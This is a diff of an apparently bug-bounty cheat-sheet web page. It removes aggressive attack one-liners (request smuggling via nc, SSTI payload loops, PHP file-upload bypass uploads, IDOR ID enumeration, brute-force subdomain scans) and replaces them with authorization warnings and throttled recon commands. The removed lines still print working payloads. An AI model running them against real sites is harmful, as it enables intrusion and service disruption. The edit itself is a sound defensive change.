@@ -1539,7 +1459,7 @@
                 <div class="tool-description">Test for race conditions</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="race-condition">echo "POST /api/endpoint HTTP/1.1\nHost: {domain}\n\nparam=value" | vegeta attack -duration=10s -rate=100 | vegeta report</span>
+                    <span class="command" id="race-condition">echo 'Prepare a repeatable request in Burp Repeater; test only a program-approved endpoint and low concurrency.'</span>
                 </div>
             </div>
         </div>
@@ -1619,7 +1539,7 @@
                 <div class="tool-description">Find potential IDOR endpoints</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="idor-finder">echo {domain} | waybackurls | grep -E "id=|user=|account=|number=|order=|no=|doc=|key=|email=|group=|profile=|edit=|report=" | sort -u</span>
+                    <span class="command" id="idor-finder">grep -Ei '[?&amp;](id|user|account|order|profile|document|record)=' urls.txt | sort -u &gt; idor-candidates.txt</span>
                 </div>
             </div>
 
@@ -1633,7 +1553,7 @@
                 <div class="tool-description">Mass test IDOR endpoints</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="idor-test">for i in {1..100}; do curl -s -H "Authorization: Bearer YOUR_TOKEN" https://{domain}/api/user/$i -w "%{http_code}\n" -o /dev/null; done</span>
+                    <span class="command" id="idor-test">echo 'Use two accounts you control. Compare access to the same object ID across accounts; do not enumerate IDs.'</span>
                 </div>
             </div>
         </div>
@@ -1653,7 +1573,7 @@
                 <div class="tool-description">Test file upload bypass techniques</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="upload-bypass">for ext in php php3 php4 php5 phtml jpg.php png.php gif.php; do echo "Testing .$ext"; curl -s -F "file=@payload.$ext" https://{domain}/upload -H "Content-Type: multipart/form-data" | grep -i "success"; done</span>
+                    <span class="command" id="upload-bypass">echo 'Use a harmless text file and the program-approved upload endpoint; do not upload executable payloads.'</span>
                 </div>
             </div>
         </div>
@@ -1713,7 +1633,7 @@
                 <div class="tool-description">Test for CL.TE request smuggling</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="clte-smuggling">echo -e "POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 35\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX: X" | nc {domain} 443</span>
+                    <span class="command" id="clte-smuggling">echo 'Request smuggling tests can disrupt services. Use a dedicated lab or explicit written authorization; no live-target command provided.'</span>
                 </div>
             </div>
         </div>
@@ -1733,7 +1653,7 @@
                 <div class="tool-description">Test for server-side template injection</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="ssti-test">for payload in "{{7*7}}" "${7*7}" "<%= 7*7 %>" "${{7*7}}" "#{7*7}" "{7*7}" "@(7*7)" "{{7*'7'}}"; do echo "Testing: $payload"; curl -s -X POST https://{domain} -d "param=$payload" | grep -i "49"; done</span>
+                    <span class="command" id="ssti-test">echo 'Start with a harmless arithmetic expression such as {{7*7}} in a lab or authorized test field; verify the rendered result manually.'</span>
                 </div>
             </div>
         </div>
@@ -1996,7 +1916,7 @@
                 <div class="tool-description">Quick subdomain enumeration with Subfinder</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="subfinder-basic">subfinder -d {domain} -o subdomains.txt</span>
+                    <span class="command" id="subfinder-basic">subfinder -d {domain} -silent -o subdomains.txt</span>
                 </div>
             </div>
 
@@ -2010,7 +1930,7 @@
                 <div class="tool-description">Deep subdomain enumeration with Amass</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="amass-deep">amass enum -d {domain} -active -brute -w /path/to/wordlist.txt -o amass_results.txt</span>
+                    <span class="command" id="amass-deep">amass enum -passive -d {domain} -o amass-passive.txt</span>
                 </div>
             </div>
 
@@ -2039,7 +1959,7 @@
                 <div class="tool-description">Get all DNS records</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="dns-enum">for sub in $(cat all_subdomains.txt); do dig +short $sub A AAAA CNAME MX NS SOA TXT; done > dns_records.txt</span>
+                    <span class="command" id="dns-enum">dig {domain} A +noall +answer</span>
                 </div>
             </div>
 
@@ -2054,7 +1974,7 @@
                 <div class="tool-description">Gather WHOIS and SSL certificate info</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="whois-ssl">whois {domain} > whois.txt && curl -s https://{domain} | openssl x509 -noout -text > ssl_info.txt</span>
+                    <span class="command" id="whois-ssl">whois {domain} | tee whois.txt</span>
                 </div>
             </div>
 
@@ -2069,7 +1989,7 @@
                 <div class="tool-description">Check for live subdomains and gather info</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="httpx-live">cat all_subdomains.txt | httpx -title -tech-detect -status-code -follow-redirects -o httpx_results.txt</span>
+                    <span class="command" id="httpx-live">httpx -l all_subdomains.txt -silent -status-code -title -tech-detect -o httpx_results.txt</span>
                 </div>
             </div>
 
@@ -2084,7 +2004,7 @@
                 <div class="tool-description">Directory and file enumeration</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="dirsearch-scan">cat httpx_results.txt | grep 200 | cut -d' ' -f1 | dirsearch -l - -e php,asp,aspx,jsp,html,zip,jar -o dirsearch_results.txt</span>
+                    <span class="command" id="dirsearch-scan">dirsearch -u 'https://{domain}/' -e php,html,txt -t 5 --delay 0.2 --format=simple -o dirsearch_results.txt</span>
                 </div>
             </div>
 
@@ -2099,7 +2019,7 @@
                 <div class="tool-description">Scan with Nuclei templates</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="nuclei-scan">cat httpx_results.txt | nuclei -t nuclei-templates -severity critical,high,medium -o nuclei_results.txt</span>
+                    <span class="command" id="nuclei-scan">nuclei -l httpx_results.txt -severity info,low,medium -rl 2 -c 2 -o nuclei_results.txt</span>
                 </div>
             </div>
 
@@ -2129,7 +2049,7 @@
                 <div class="tool-description">Smart web crawling</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="katana-crawl">katana -list httpx_results.txt -jc -kf all -o katana_results.txt</span>
+                    <span class="command" id="katana-crawl">katana -u 'https://{domain}' -d 2 -jc -kf robotstxt,sitemapxml -rl 2 -silent -o katana_results.txt</span>
                 </div>
             </div>
 
@@ -2159,7 +2079,7 @@
                 <div class="tool-description">Check for CORS misconfigurations</div>
                 <div class="terminal-box">
                     <span class="prompt">$</span>
-                    <span class="command" id="corsy-check">corsy -i httpx_results.txt -t 50 -o cors_results.txt</span>
+                    <span class="command" id="corsy-check">echo 'Use the maintained CORScanner installation instructions and run against one authorized URL at a time.'</span>
                 </div>
             </div>
 
